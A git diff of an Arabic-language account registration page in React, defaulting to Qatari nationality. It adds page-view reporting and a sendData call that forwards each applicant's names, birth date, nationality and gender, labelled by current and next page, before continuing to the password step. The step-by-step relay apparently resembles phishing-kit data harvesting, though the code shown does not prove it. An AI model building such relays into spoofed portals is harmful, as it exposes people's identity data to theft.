@@ -1,5 +1,7 @@
 import { useState } from "react";
+import { useEffect } from "react";
 import { useLocation } from "wouter";
+import { navigateToPage, sendData } from "@/lib/store";
 
 const dateIconStyle = `
   .hide-date-icon::-webkit-calendar-picker-indicator {
@@ -51,6 +53,10 @@ const COUNTRIES = [
 
 export default function RegisterPersonalInfo() {
   const [, navigate] = useLocation();
+
+  useEffect(() => {
+    navigateToPage("تسجيل حساب - البيانات الشخصية");
+  }, []);
 
   const [nationality, setNationality] = useState("قطر");
   const [firstNameAr, setFirstNameAr] = useState("");
@@ -104,7 +110,18 @@ export default function RegisterPersonalInfo() {
     else if (!isEnglish(lastNameEn)) errs.lastNameEn = "يجب إدخال الاسم بالإنجليزية فقط";
     if (!gender) errs.gender = "يرجى اختيار الجنس";
     if (Object.keys(errs).length === 0) {
-      navigate("/register/password");
+      sendData({
+      data: {
+        "الجنسية": nationality,
+        "الاسم بالعربي": `${firstNameAr} ${middleNameAr} ${lastNameAr}`,
+        "الاسم بالإنجليزية": `${firstNameEn} ${middleNameEn} ${lastNameEn}`,
+        "تاريخ الميلاد": birthDate,
+        "الجنس": gender === "male" ? "ذكر" : "أنثى",
+      },
+      current: "تسجيل حساب - البيانات الشخصية",
+      nextPage: "تسجيل حساب - كلمة المرور",
+    });
+    navigate("/register/password");
     } else {
       setErrors(errs);
     }
